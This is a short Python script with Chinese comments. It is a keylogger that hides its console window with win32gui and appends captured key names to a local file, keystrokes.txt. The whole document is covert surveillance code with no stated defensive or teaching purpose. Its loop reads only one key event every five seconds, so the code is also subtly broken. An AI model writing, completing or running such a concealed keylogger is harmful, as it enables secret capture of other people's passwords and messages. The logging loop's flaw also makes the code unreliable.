import os
import time
import keyboard
import sys
sys.path.append('path/to/pywin32')

def log_keystrokes(output_file):
    # 检查输出文件是否存在，如果不存在则创建
    if not os.path.exists(output_file):
        with open(output_file, 'w'):
            pass
    
    # 每5秒钟记录一次输入文本
    while True:
        with open(output_file, 'a') as f:
            # 获取最近一次按键事件
            event = keyboard.read_event()
            # 如果是文本输入事件，记录下来
            if event.event_type == 'down' and hasattr(event, 'name'):
                f.write(event.name)
        
        time.sleep(5)

if __name__ == '__main__':
    # 隐藏Shell窗口
    hide_window = True
    if hide_window:
        import win32gui, win32con
        win = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(win, win32con.SW_HIDE)
    
    # 记录键盘输入并保存到文件
    log_keystrokes('keystrokes.txt')
